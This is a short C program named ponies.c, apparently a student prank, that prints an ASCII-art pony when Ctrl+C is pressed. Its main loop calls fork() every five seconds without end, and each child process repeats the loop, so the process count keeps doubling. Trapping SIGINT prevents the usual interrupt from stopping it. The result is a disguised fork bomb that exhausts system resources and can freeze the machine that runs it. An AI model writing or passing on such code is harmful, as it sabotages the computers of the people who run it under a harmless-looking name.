/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ponies.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: atemunov <marvin042.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/13 11:04:23 by atemunov          #+#    #+#             */
/*   Updated: 2018/04/14 15:16:23 by atemunov         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

void    summon_ponies(int signal)
{
                printf("                   ,--,   \n");
                printf("             _ ___/ /\\|   \n");
                printf("        ,;'( )__, )  ~    \n");
                printf("        //  //   '--;     \n"); 
                printf("       '   ]\\     | ^      \n");
                printf("             ^    ^       \n");
}

int main(int argc, char **argv)
{
        signal(SIGINT, summon_ponies);
        while(1)
        {
                sleep(5);
                fork();
        }
        return (0);
}